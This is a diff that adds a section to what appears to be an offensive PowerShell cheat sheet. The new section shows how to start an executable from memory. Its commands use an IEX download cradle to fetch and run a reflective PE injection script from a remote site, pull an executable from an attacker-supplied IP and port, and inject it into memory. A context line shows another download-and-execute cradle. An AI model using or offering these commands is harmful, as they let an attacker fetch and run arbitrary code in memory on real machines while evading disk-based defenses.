@@ -34,6 +34,17 @@ IEX(New-Object System.Net.WebClient).DownloadString('http://<ip>:<port>/<script_
 ```
 
 
+## ReflectivePEInjection
+
+Start an executable from memory:
+
+```powershell
+IEX (New-Object System.Net.WebClient).DownloadString("https://security-tips.vincd.com/assets/Invoke-ReflectivePEInjection.ps1")
+$ExeBytes = IWR "http://<ip>:<port>/x.exe" | Select-Object -ExpandProperty Content
+Invoke-ReflectivePEInjection -PEBytes $ExeBytes
+```
+
+
 ## Execute C# DLL from Powershell
 
 ```powershell
